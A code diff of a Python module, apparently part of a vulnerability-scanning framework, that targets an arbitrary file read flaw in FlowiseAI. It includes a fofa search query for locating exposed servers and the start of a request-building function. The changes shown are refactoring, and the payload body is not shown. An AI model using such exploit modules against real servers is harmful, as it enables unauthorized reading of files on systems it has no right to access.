@@ -5,11 +5,16 @@ fofa 搜索: "FlowiseAI"
 漏洞类型: 任意文件读取
 FlowiseAI是一个基于Node.js和React构建的开源项目，提供直观的可视化界面来设计和部署AI工作流。它采用模块化架构，支持超过100种AI服务和工具的无缝集成。FlowiseAI /api/v1/get-upload-file 和 /api/v1/openai-assistants-file/download 两个接口存在任意文件读取漏洞
 """
+import json
 import os.path
-import sys, json
+import sys
+from urllib.parse import urljoin
 from src import api, utils
 
-logger = utils.Logger(level='DEBUG')
+__all__ = [
+    "search",
+    "start"
+]
 
 
 def search(email, key):
@@ -25,7 +30,7 @@ def start(host, *args, **kwargs):
     :param kwargs:
     :return:
     """
-    url = f"{host}/api/v1/vector/upsert/"
+    url = urljoin(host, "/api/v1/vector/upsert/")
     headers = {
         "Connection": "close",
         "Content-Type": "multipart/form-data; boundary=9ba23d44616773ddb04e2747c630fe1b"
